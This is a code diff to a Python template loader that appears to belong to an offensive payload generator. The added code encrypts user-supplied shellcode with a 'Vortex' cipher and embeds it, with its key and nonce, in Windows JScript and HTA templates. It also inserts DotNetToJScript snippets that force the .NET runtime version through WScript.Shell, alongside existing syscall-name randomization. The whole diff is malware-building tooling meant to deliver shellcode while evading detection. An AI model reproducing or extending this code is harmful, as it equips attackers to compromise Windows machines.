@@ -59,7 +59,11 @@ class TemplateLoader:
         self.build_options = ""
         if not hasattr(self, 'arch'):
             self.arch = 'x64'
-
+            
+        # Check if this is VortexShooter template
+        self.is_vortex_shooter = self.is_vortex_shooter_template()
+        
+        
         # Verify template x64 compatibility 
         self.expected_formats, self.output_format, self.custom_output, self.compiler_args = Config().get_template_formats(self.platform, self.method)
         self.input_file_type = verify_file_type(self.shellcode_variable)
@@ -116,6 +120,44 @@ class TemplateLoader:
 
         if self.shellcode32_variable:
             self.shellcode32bControler = ShellcodeControler(self.shellcode32_variable, self.encryptors_chain, self.platform)
+        
+        # Handle VortexShooter special case
+        if self.is_vortex_shooter:
+            self.handle_vortex_shooter()
+
+
+    def is_vortex_shooter_template(self):
+        """Check if the current template is VortexShooter on supported platforms"""
+        return (self.method in ["VortexShooter", "PowerShooter"] and 
+                self.platform in ["windows_js", "windows_hta"])
+        
+        
+    def handle_vortex_shooter(self):
+        """Handle VortexShooter template with built-in Vortex encryption"""
+        from core.encryptors.vortex import vortex
+        import base64
+
+        # Clear any user-specified encryptors
+        self.encryptors = []
+
+        # Read shellcode
+        if isinstance(self.shellcode_variable, str) and verify_file_type(self.shellcode_variable) == inputType.TEXT:
+            shellcode_bytes = bytes(self.shellcode_variable, 'utf-8')
+        else:
+            with open(self.shellcode_variable, 'rb') as f:
+                shellcode_bytes = f.read()
+
+        # Create vortex encryptor and encrypt
+        vortex_encryptor = vortex(self.platform)
+        encrypted_data = vortex_encryptor.encode(shellcode_bytes)
+
+        # Store base64 encoded key and nonce for template placeholders
+        self.b64_vortex_key = base64.b64encode(vortex_encryptor.key).decode('utf-8')
+        self.b64_vortex_nonce = base64.b64encode(vortex_encryptor.nonce).decode('utf-8')
+
+        # Store encrypted shellcode for template
+        self.vortex_encrypted_shellcode = base64.b64encode(encrypted_data).decode('utf-8')
+
 
     def copy_new_template_file(self):
         src_file = f"{Config().get('FOLDERS', 'methods')}/{self.platform}/{self.method}.esc"
@@ -232,6 +274,19 @@ class TemplateLoader:
             if component :
                 define_components_code += component.code
         template_content = template_content.replace(define_placeholder,define_components_code)
+        
+            # Handle VortexShooter special placeholders
+        if self.is_vortex_shooter:
+            if "####B64_VORTEX_KEY####" in template_content:
+                template_content = template_content.replace("####B64_VORTEX_KEY####", 
+                                                           self.b64_vortex_key)
+            if "####B64_VORTEX_NONCE####" in template_content:
+                template_content = template_content.replace("####B64_VORTEX_NONCE####", 
+                                                           self.b64_vortex_nonce)
+            if "####SHELLCODE####" in template_content:
+                template_content = template_content.replace("####SHELLCODE####", 
+                                                           f'"{self.vortex_encrypted_shellcode}"')
+    
 
         # Replace Shellcode
         shellcode_placeholder = Config().get('PLACEHOLDERS', 'shellcode')
@@ -345,6 +400,27 @@ class TemplateLoader:
                 print(f"{Fore.GREEN}[+] {Fore.WHITE}Generated custom XML part in {xml_file_path}")
                 template_content = template_content.replace(required_custom_part_placeholder, part_name)
         
+        # Replace DotNetToJScript
+        dotnet2js_placeholder = Config().get('PLACEHOLDERS', 'DOTNET2JS_VERSION')
+        if hasattr(self, 'dot2js_version'):
+            if self.dot2js_version == "4":
+                dot2js_replacement = "new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';"
+            elif self.dot2js_version == "2":
+                dot2js_replacement = ""
+            elif self.dot2js_version == "auto":
+                dot2js_replacement = """var shell = new ActiveXObject('WScript.Shell');
+ver = 'v4.0.30319';
+try {
+shell.RegRead('HKLM\\\\SOFTWARE\\\\Microsoft\\\\.NETFramework\\\\v4.0.30319\\\\');
+} catch(e) { 
+ver = 'v2.0.50727';
+}
+shell.Environment('Process')('COMPLUS_Version') = ver;"""
+            else:
+                dot2js_replacement = ""
+            template_content = template_content.replace(dotnet2js_placeholder, dot2js_replacement)
+    
+        
         
         # Randomize Syscall names
         # To adapt for SW3 and 
@@ -444,6 +520,8 @@ class TemplateLoader:
 
         if not hasattr(self, 'entry_args') or not self.entry_args:
             self.entry_args = ""
+            
+            
 
     def load_strong_name(self):
         from colorama import Fore
